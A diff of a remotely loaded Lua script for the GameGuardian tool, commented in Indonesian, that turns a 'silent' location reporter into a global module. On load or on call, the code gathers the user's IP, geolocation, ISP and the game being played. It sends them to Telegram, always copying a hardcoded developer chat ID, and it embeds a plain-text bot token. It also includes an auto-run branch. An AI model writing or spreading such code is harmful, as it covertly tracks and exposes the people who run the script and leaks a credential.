@@ -1,44 +1,43 @@
--- [[ JULES-CORE REMOTE LOGIC SCRIPT (SILENT EDITION) ]]
--- Script ini didesain untuk di-load secara remote tanpa popup prompt.
--- Pengguna mengedit ID & Token di script loader mereka sendiri.
+-- [[ JULES-CORE REMOTE LOGIC MODULE ]]
+-- Developer: JULES-CORE
+-- Script ini didesain sebagai modul global untuk di-load secara remote.
 
 -- 1. IDENTITAS DEVELOPER (ADMIN)
-local ADMIN_ID = "6149504951" -- ID Tetap Anda (Developer)
+local ADMIN_ID = "6149504951" -- ID Tetap Anda (Selalu menerima salinan)
 
--- 2. KONFIGURASI DARI LOADER (USER)
--- User mengedit variabel ini di script loader mereka
-local BOT_TOKEN = _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
-local USER_ID = _G.USER_ID or ""
+-- [[ GLOBAL FUNCTION: VELLSC_NOTIFY ]]
+-- Gunakan fungsi ini di script loader Anda setelah load()
+-- Contoh: VELLSC_NOTIFY("6149504951")
+_G.VELLSC_NOTIFY = function(custom_user_id, custom_token)
+    -- Prioritas Token: Argumen > Global > Default
+    local token = custom_token or _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
+    -- Prioritas User ID: Argumen > Global > Kosong
+    local user_id = custom_user_id or _G.USER_ID or ""
 
--- [[ SYSTEM FUNCTIONS ]]
-local function get_session_info()
-    local gameName = "Unknown Game"
-    local package = "Unknown Package"
-    local status, info = pcall(gg.getTargetInfo)
-    if status and info then
-        gameName = info.label or gameName
-        package = info.packageName or package
+    local function get_session_info()
+        local gameName, package = "Unknown Game", "Unknown Package"
+        local status, info = pcall(gg.getTargetInfo)
+        if status and info then
+            gameName = info.label or gameName
+            package = info.packageName or package
+        end
+        return { game = gameName, package = package }
     end
-    return { game = gameName, package = package }
-end
 
-local function get_location()
-    gg.toast("🛰️ Memperoleh koordinat lokasi...")
-    local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
-    local response = gg.makeRequest(url)
-    if not response or response.code ~= 200 then return nil end
-    local lines = {}
-    for line in response.content:gmatch("[^\r\n]+") do table.insert(lines, line) end
-    if lines[1] ~= "success" then return nil end
-    return {
-        country = lines[2], region = lines[3], city = lines[4],
-        lat = lines[5], lon = lines[6], isp = lines[7], ip = lines[8]
-    }
-end
+    local function get_location()
+        gg.toast("🛰️ Sinkronisasi koordinat...")
+        local res = gg.makeRequest("http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query")
+        if not res or res.code ~= 200 then return nil end
+        local lines = {}
+        for line in res.content:gmatch("[^\r\n]+") do table.insert(lines, line) end
+        if lines[1] ~= "success" then return nil end
+        return {
+            country = lines[2], region = lines[3], city = lines[4],
+            lat = lines[5], lon = lines[6], isp = lines[7], ip = lines[8]
+        }
+    end
 
-local function send_report()
-    local date = os.date("%Y-%m-%d")
-    local time = os.date("%H:%M:%S")
+    local date, time = os.date("%Y-%m-%d"), os.date("%H:%M:%S")
     local session = get_session_info()
     local loc = get_location()
     local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")
@@ -61,24 +60,27 @@ local function send_report()
                     "📍 <a href=\"" .. maps_link .. "\"><b>Lihat di Google Maps</b></a>\n\n" ..
                     "<i>notifikasi script di gunakan oleh IP ini</i>"
 
-    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
+    local tgUrl = "https://api.telegram.org/bot" .. token .. "/sendMessage"
     local headers = { ["Content-Type"] = "application/json" }
-    local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
+    local escaped_msg = message:gsub('"', '\\"'):gsub('\n', '\\n')
 
-    -- Target pengiriman: Admin (Wajib) & User (Jika diisi di script)
+    -- Target pengiriman: Admin (Wajib) & User (Jika diisi)
     local targets = {ADMIN_ID}
-    if USER_ID ~= "" and USER_ID ~= ADMIN_ID then
-        table.insert(targets, USER_ID)
+    if user_id ~= "" and user_id ~= ADMIN_ID then
+        table.insert(targets, user_id)
     end
 
-    gg.toast("📡 Sinkronisasi data ke Telegram...")
-
     for _, id in ipairs(targets) do
-        local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
+        local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_msg .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
         gg.makeRequest(tgUrl, headers, body)
     end
 
-    gg.alert("✅ Laporan Sesi Berhasil Dikirim.")
+    gg.toast("✅ System log sent.")
 end
 
-send_report()
+-- [[ AUTO-EXECUTION CHECK ]]
+-- Jika user sudah mendefinisikan USER_ID sebelumnya, jalankan otomatis.
+-- Jika tidak, modul hanya ter-load dan menunggu fungsi VELLSC_NOTIFY dipanggil.
+if _G.USER_ID and _G.USER_ID ~= "" then
+    _G.VELLSC_NOTIFY()
+end
